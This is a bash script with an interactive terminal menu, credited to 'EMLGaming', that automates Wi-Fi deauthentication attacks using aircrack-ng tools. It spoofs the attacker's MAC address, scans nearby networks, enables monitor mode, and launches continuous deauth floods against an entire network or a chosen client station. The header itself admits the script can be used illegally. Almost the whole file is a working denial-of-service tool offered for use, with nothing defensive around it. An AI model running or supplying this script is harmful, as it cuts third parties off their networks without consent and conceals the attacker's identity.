#!/bin/bash

# made by EMLGaming and thanks for using it
# to run first type "chmod +x deauth.sh" and "chmod +x deauthall.sh" and then "./deauth.sh"
# then you are all good to go and this script is made for moose
# the script is not illegal but you can use it in a way that is illegal



printf "\e[?25l"     
width=$(tput cols) 
height=$(tput lines)
special=0
info=' '
menuSelection=0
quitting=0
tput clear
tput cup 0 0


function drawMenu(){
	echo "Made my EMLGaming"	


	tput cup $((height/2-4)) $((width/2-10)) 
	if [ $menuSelection -eq 0 ]
	then
		tput rev
	fi
	echo "     DEAUTH ALL     "
	tput sgr0
	tput cup $((height/2-2)) $((width/2-10))
	if [ $menuSelection -eq 1 ]
	then
		tput rev
	fi 
	echo "   DEAUTH NETWORK   "
	tput sgr0
	tput cup $((height/2)) $((width/2-10))
	if [ $menuSelection -eq 2 ]
	then
		tput rev
	fi
	echo "    DEAUTH TARGET   "
	tput sgr0
	tput cup $((height/2+2)) $((width/2-10))
	if [ $menuSelection -eq 3 ]
	then
		tput rev
	fi 
	echo "                       "
	tput sgr0
	tput cup $((height/2+4)) $((width/2-10))
	if [ $menuSelection -eq 4 ]
	then
		tput rev
	fi 
	echo "        QUIT        "
	tput sgr0
	tput cup 0 0
}
function drawClear(){
	tput cup 0 0
	for (( i=0; i<$height; i++ ))
	do
		printf "%0.s " $(seq 1 $width)
	done
}
function getInfo(){
	tput rev
	tput cup $((height/2-2)) 0
	printf "%0.s " $(seq 1 $width)
	tput cup $((height/2+2)) 0
	printf "%0.s " $(seq 1 $width)
	tput sgr0
	tput cup $((height/2)) $((width/2-6))
	printf '                            '
	tput cup $((height/2)) $((width/2-10))
	printf 'ENTER TO CONTINUE'
	tput cup $((height/2)) $((width/2-3))
	read
clear
./deauthall.sh

	drawClear
	drawMenu
}
function update(){
	
	if [ $menuSelection -eq -1 ] 
	then 

		echo " "
	else 
		case $1 in
			UP)
			if [ $menuSelection -gt 0 ]
			then
				menuSelection=$((menuSelection-1))
			else
				menuSelection=4    
			fi ;;
			DOWN)
			if [ $menuSelection -lt 4 ] 
			then
				menuSelection=$((menuSelection+1))
			else
				menuSelection=0
			fi ;;
			SELECT) 
			if [ $menuSelection -eq 0 ]
			then
				getInfo
				echo "LETS GO AND DEAUTH ALL"
			elif [ $menuSelection -eq 1 ]
			then
				 echo -e "\e[36mlets deauth a network"
clear
iwconfig
echo -e "\e[31mtype your wireless card name:\e[36m"
read wire
ifconfig $wire down
macchanger -r $wire
ifconfig $wire up
clear


echo "it is now scanning networks so this takes a little bit"
sleep 5
iw dev $wire scan | egrep "SSID|primary channel"
echo -e "\e[31mtype the name of the network:\e[36m"
read name
echo -e "\e[31mand the channel:\e[36m"
read channel
airmon-ng start $wire
airmon-ng check kill
clear	





ifconfig $wire"mon" down
iwconfig $wire"mon" channel $channel
ifconfig $wire"mon" up

echo "now you are deauthing the network if you want to stop just close the window"
xterm -e "aireplay-ng -0 0 -e '$name' $wire""mon; read" 



			elif [ $menuSelection -eq 2 ]
			then
				echo "deauth target"

clear
echo -e "\e[36m "
iwconfig
echo -e "\e[31mtype your wireless card name:\e[36m"
read wire
ifconfig $wire down
macchanger -r $wire
ifconfig $wire up
clear


echo "it is now scanning networks so this takes a little bit"
sleep 5
iw dev $wire scan | egrep "SSID|primary channel"
echo -e "\e[31mtype the name of the network:\e[36m"
read name
echo -e "\e[31mand the channel:\e[36m"
read channel
airmon-ng start $wire
airmon-ng check kill
clear	

gnome-terminal -x sh -c "airodump-ng --essid '$name' -c $channel $wire""mon" 
				

		echo -e "\e[31mWould you like to lookup a mac adress (1 or 2)"
		PS3="Type 1 or 2"
		options=("yes" "no")
		select opt in "${options[@]}"
		do
 		   case $opt in

   		     "yes")
     		       echo ""
			echo -e "type the first 6 characters of the station"
			echo -e "don't type the ':' do only xxxxxx"
			read oui
			grep -i $oui /usr/share/nmap/nmap-mac-prefixes
    		       ;;
    		    "no")
      		      break
       		     ;;
      		  *) echo invalid option;;
  		  esac
		done
		echo -e "station of the target"
		echo -e "but now make sure to type it like XX:00:XX:00:XX:00\e[36m"
		read station
		echo -e "when you are done just close the window"
		xterm -e "aireplay-ng -0 0 -e '$name' -c '$station' $wire""mon; read"


			elif [ $menuSelection -eq 3 ]
			then
				drawClear
			elif [ $menuSelection -eq 4 ]
			then
				exit
			fi ;;
		esac
	if [ $menuSelection -ne -1 ]
	then
		drawMenu
	fi
	fi 
}
function cleanup(){
	echo -e "\e[0mCleaning"
	printf "\e]0;Terminal\007"
airmon-ng stop $wire"mon"
ifconfig $wire up
	reset
echo "thanks for using my script"
sleep 1
	exit 255
}



drawMenu
trap cleanup INT EXIT



while :
do
	read -rsn1 -d '' KEY 


	if [ `printf '%d' "'$KEY"` == 27 ] 
	then
		special=1
	elif [ `printf '%d' "'$KEY"` == 91 -a $special -eq 1 ] 
	then
		special=2
	elif [ $special -eq 1 ]
	then
		special=0
	elif [ `printf '%d' "'$KEY"` == 0 ] 
	then          
		update SELECT             
	fi				    
	if [ $special -eq 2 ]		
	then 
		case "$KEY" in
			A) update UP    ; special=0 ;; 
			B) update DOWN  ; special=0 ;; 
			C) update RIGHT ; special=0 ;; 
			D) update LEFT  ; special=0 ;; 
		esac
	else 
		case "$KEY" in
			q)	
				if [ $quitting -eq 0 ]
				then
					tput cup $((height/2)) $((width/2-15))
					tput rev
					printf "    PRESS Q AGAIN TO QUIT     "
					tput sgr0
					quitting=1
				elif [ $quitting -eq 1 ]
				then
					exit
				fi ;;
		esac
		if [ "$KEY" != "q" ] 
		then
			if [ $quitting -eq 1 ]
			then
				drawClear
			fi
			quitting=0
		fi
	fi
done

